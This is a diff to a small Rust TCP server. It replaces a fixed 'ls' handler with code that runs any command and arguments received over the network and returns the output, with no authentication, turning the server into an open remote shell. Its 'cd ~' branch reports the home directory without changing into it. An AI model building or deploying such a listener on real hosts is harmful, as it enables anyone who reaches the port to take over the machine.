@@ -1,7 +1,8 @@
+use std::env;
 use std::{
     io::{self, Read, Write},
     net::{TcpListener, TcpStream},
-    process::Command,
+    process::{Command, Stdio},
 };
 
 fn main() -> std::io::Result<()> {
@@ -49,19 +50,54 @@ fn process_stream(mut stream: TcpStream) -> io::Result<()> {
 }
 
 fn execute_command(message: &str) -> io::Result<String> {
-    if message.trim() == "ls" {
-        let output = if cfg!(target_os = "windows") {
-            Command::new("cmd").args(&["/C", "dir"]).output()?
+    let trimmed_message = message.trim();
+
+    // Split the input into command and arguments
+    let mut parts = trimmed_message.split_whitespace();
+    if let Some(command) = parts.next() {
+        if command == "cd" {
+            // Get the directory argument
+            let target_dir = parts.next().unwrap_or("~");
+
+            // Change directory
+            let result = if target_dir == "~" {
+                // Change to home directory
+                dirs::home_dir().ok_or_else(|| {
+                    io::Error::new(io::ErrorKind::NotFound, "Home directory not found")
+                })
+            } else {
+                // Change to the specified directory
+                env::set_current_dir(target_dir).map(|_| env::current_dir().unwrap())
+            };
+
+            match result {
+                Ok(new_dir) => Ok(format!("Changed directory to: {}\n", new_dir.display())),
+                Err(e) => Ok(format!("Failed to change directory: {}\n", e)),
+            }
         } else {
-            Command::new("ls").output()?
-        };
-        println!(
-            "Command output: {}",
-            String::from_utf8_lossy(&output.stdout)
-        );
+            // Collect the arguments after the command
+            let args: Vec<&str> = parts.collect();
 
-        return Ok(String::from_utf8_lossy(&output.stdout).to_string());
+            // Use Command to run the specified command
+            let output = Command::new(command)
+                .args(&args)
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .output()?;
+
+            // Get stdout and stderr
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let stderr = String::from_utf8_lossy(&output.stderr);
+
+            // Return stdout if the command was successful, otherwise return stderr
+            if output.status.success() {
+                Ok(stdout.to_string())
+            } else {
+                Ok(stderr.to_string())
+            }
+        }
+    } else {
+        // If the command is empty
+        Ok("No command received.".to_string())
     }
-
-    return Ok(format!("Unknown command: {}\n", message.trim()));
 }
